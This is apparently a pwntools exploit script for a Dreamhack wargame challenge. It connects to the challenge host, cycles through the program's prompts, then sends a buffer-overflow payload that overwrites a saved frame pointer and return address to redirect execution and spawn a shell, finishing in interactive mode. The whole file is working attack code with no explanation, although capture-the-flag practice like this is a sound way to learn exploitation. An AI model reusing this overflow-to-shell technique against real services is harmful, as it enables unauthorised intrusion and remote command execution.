from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 15429
r = remote(HOST, PORT)

sel=0x404079
setup=0x4013CB

for i in range(9):
    r.sendafter(b': ', b'A')
    r.sendafter(b': ', b'A')    
    r.sendafter(b'y/n\n',b'y')

r.sendafter(b': ', b'A'*60)
r.sendafter(b': ', b'A'*48+p64(sel+0x70)+p64(setup))
r.sendafter(b'y/n\n',b'sh')

r.interactive()